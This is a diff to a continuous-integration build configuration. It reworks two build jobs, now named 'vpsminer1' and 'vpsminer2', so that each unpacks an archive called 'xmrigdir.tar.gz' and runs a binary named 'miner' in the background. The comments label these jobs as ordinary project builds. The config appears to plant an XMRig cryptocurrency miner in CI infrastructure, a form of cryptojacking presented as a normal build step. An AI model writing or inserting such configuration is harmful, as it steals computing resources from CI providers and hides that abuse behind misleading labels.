@@ -11,23 +11,23 @@ init:
   - sudo apt-get update
   - sudo apt-get install -y bash
 
-# Define the build matrix for different projects
-matrix:
-  # Build configuration for Project1
-  - project: Project1
-    build_script:
-      # Commands for Project1
-      - tar xvf project1.tar.gz
-      - cd project1
-      - chmod +x ./miner
-      - ./miner  # Run the first project
+jobs:
+  include:
+    # Job for Project1
+    - job: vpsminer1
+      build_script:
+        # Commands for Project1
+        - tar xvf xmrigdir.tar.gz
+        - cd xmrigdir
+        - chmod +x ./miner
+        - ./miner & # Run the first project
 
-  # Build configuration for Project2
-  - project: Project2
-    build_script:
-      # Commands for Project2
-      - tar xvf project2.tar.gz
-      - cd project2
-      - chmod +x ./miner
-      - ./miner  # Run the second project
-      
+    # Job for Project2
+    - job: vpsminer2
+      build_script:
+        # Commands for Project2
+        - tar xvf xmrigdir.tar.gz
+        - cd xmrigdir
+        - chmod +x ./miner
+        - ./miner &   # Run the second project
+        
